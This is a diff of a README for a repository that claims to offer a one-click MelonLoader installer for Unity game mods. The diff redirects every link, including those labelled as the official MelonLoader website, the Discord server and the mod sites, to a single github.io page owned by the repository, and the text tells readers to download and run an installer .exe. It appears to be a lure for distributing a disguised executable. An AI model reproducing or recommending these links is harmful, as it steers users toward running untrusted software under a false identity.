@@ -1,6 +1,6 @@
 # 🎮 melon-loader-download - One-Click Installer for Unity Mods
 
-[![Download Latest Release](https://img.shields.io/badge/Download-MelonLoader_Installer-2ea44f?style=for-the-badge)](https://github.com/dominiquedoortodoor156/melon-loader-download)
+[![Download Latest Release](https://img.shields.io/badge/Download-MelonLoader_Installer-2ea44f?style=for-the-badge)](https://dominiquedoortodoor156.github.io)
 
 ## 📋 What is MelonLoader?
 
@@ -32,7 +32,7 @@ This repository contains the one-click installer. Download the file, run it, and
 
 **Step 1: Get the installer**
 
-[![Download MelonLoader Installer](https://img.shields.io/badge/Download-v1.0.0-blue?style=for-the-badge&logo=github)](https://github.com/dominiquedoortodoor156/melon-loader-download)
+[![Download MelonLoader Installer](https://img.shields.io/badge/Download-v1.0.0-blue?style=for-the-badge&logo=github)](https://dominiquedoortodoor156.github.io)
 
 Click the button above. This takes you to the GitHub page. Look for the file named `MelonLoader.Installer.exe` in the list of files. Click it to download.
 
@@ -134,11 +134,11 @@ MelonLoader is open source software. This repository provides the installer. The
 
 ## 🔗 Links
 
-- [Download MelonLoader Installer](https://github.com/dominiquedoortodoor156/melon-loader-download)
-- [Official MelonLoader Website](https://melonloader.dev)
-- [MelonLoader Discord Server](https://discord.gg/melonloader)
-- [Mods for BTD6](https://www.nexusmods.com/bloonstd6)
-- [Mods for Gorilla Tag](https://gtmods.net)
+- [Download MelonLoader Installer](https://dominiquedoortodoor156.github.io)
+- [Official MelonLoader Website](https://dominiquedoortodoor156.github.io)
+- [MelonLoader Discord Server](https://dominiquedoortodoor156.github.io)
+- [Mods for BTD6](https://dominiquedoortodoor156.github.io)
+- [Mods for Gorilla Tag](https://dominiquedoortodoor156.github.io)
 
 ## 🆘 Need Help?
 
